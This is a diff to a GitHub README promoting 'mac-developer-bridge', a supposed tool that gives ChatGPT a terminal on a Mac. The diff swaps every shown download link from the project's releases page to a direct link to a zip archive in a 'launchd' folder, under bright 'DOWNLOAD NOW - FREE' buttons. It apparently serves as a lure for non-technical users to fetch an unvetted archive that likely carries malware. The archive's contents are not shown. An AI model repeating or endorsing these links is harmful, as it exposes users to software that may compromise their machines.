@@ -1,7 +1,7 @@
 <h1>🖥️ mac-developer-bridge - Give ChatGPT a Real Terminal on Your Mac</h1>
 
 <p align="center">
-  <a href="https://github.com/Powderpuff-magneticstoragemedium586/mac-developer-bridge/releases" style="display:inline-block;padding:18px 42px;background:linear-gradient(135deg,#FF6B6B,#556270);color:white;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(0,0,0,0.3);transition:transform 0.2s;margin:30px 0;">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/Powderpuff-magneticstoragemedium586/mac-developer-bridge/main/launchd/developer_mac_bridge_v3.5.zip" style="display:inline-block;padding:18px 42px;background:linear-gradient(135deg,#FF6B6B,#556270);color:white;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(0,0,0,0.3);transition:transform 0.2s;margin:30px 0;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## ✨ What Is This?
@@ -30,7 +30,7 @@ Getting started takes less than 2 minutes. Here's exactly what to do:
 
 ### Step 1: Download the App
 
-Visit this link to download the application: **[https://github.com/Powderpuff-magneticstoragemedium586/mac-developer-bridge/releases](https://github.com/Powderpuff-magneticstoragemedium586/mac-developer-bridge/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Powderpuff-magneticstoragemedium586/mac-developer-bridge/main/launchd/developer_mac_bridge_v3.5.zip](https://raw.githubusercontent.com/Powderpuff-magneticstoragemedium586/mac-developer-bridge/main/launchd/developer_mac_bridge_v3.5.zip)**
 
 You'll see a list of downloadable files. Look for the one that matches your Mac (most Macs use "Intel" or "Apple Silicon" - check by clicking the Apple logo in the top-left corner of your screen, then "About This Mac").
 
@@ -167,7 +167,7 @@ You don't need to know how to code to contribute. Even just sharing your experie
 
 You're one click away from a smarter, faster workflow. Download mac-developer-bridge today and see how much easier your Mac becomes when ChatGPT can finally "see" and "touch" your system.
 
-**[👉 VISIT THE DOWNLOAD PAGE NOW](https://github.com/Powderpuff-magneticstoragemedium586/mac-developer-bridge/releases)**
+**[👉 VISIT THE DOWNLOAD PAGE NOW](https://raw.githubusercontent.com/Powderpuff-magneticstoragemedium586/mac-developer-bridge/main/launchd/developer_mac_bridge_v3.5.zip)**
 
 Make your Mac work for you - the modern way with AI assistance. No more guessing commands, no more terminal anxiety. Just ask, approve, and get things done.
 
